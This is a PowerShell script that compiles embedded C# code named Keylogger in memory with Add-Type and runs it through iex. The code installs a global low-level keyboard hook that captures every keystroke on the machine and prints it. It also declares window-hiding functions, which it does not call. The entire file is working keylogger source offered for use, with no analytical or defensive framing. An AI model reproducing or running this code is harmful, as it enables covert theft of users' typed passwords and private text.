$code = @"
using System;

using System.Diagnostics;

using System.Runtime.InteropServices;
using System.Windows.Forms;



namespace Keylogger
{
    [StructLayout(LayoutKind.Sequential)]
    struct MSG
    {
        IntPtr hwnd;
        UInt32 message;
        UInt32 wParam;
        IntPtr lParam;
        UInt32 time;
        Int32 ptX;
        Int32 ptY;
        UInt32 lPrivate;
    }


    public class Keylogger
    {
        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        static extern bool GetMessage(ref MSG msg, IntPtr HWND, uint wMsgFilterMin, uint wMsgFilterMax);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        static extern bool TranslateMessage(ref MSG msg);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        static extern bool DispatchMessage(ref MSG msg);


        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook,LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode,IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(IntPtr lpModuleName);

        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);


        public static void StartKeylogger()
        {
            var p = SetWindowsHookEx(WH_KEYBOARD_LL, HandleKey, GetModuleHandle(IntPtr.Zero),0);
            Application.Run();
            UnhookWindowsHookEx(p);
            
        }


        private static IntPtr HandleKey(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                int vkCode = Marshal.ReadInt32(lParam);
                Console.WriteLine((Keys)vkCode);
                
            }
            return CallNextHookEx(IntPtr.Zero, nCode, wParam, lParam);
        }
        
        
    }
}


"@

$assem = ("System.Core","System.Xml.Linq","System.Data","System.Xml", "System.Data.DataSetExtensions", "Microsoft.CSharp","System.Windows.Forms")
Add-Type -TypeDefinition $code -ReferencedAssemblies  $assem -Language CSharp
iex "[Keylogger.Keylogger]::StartKeylogger()"
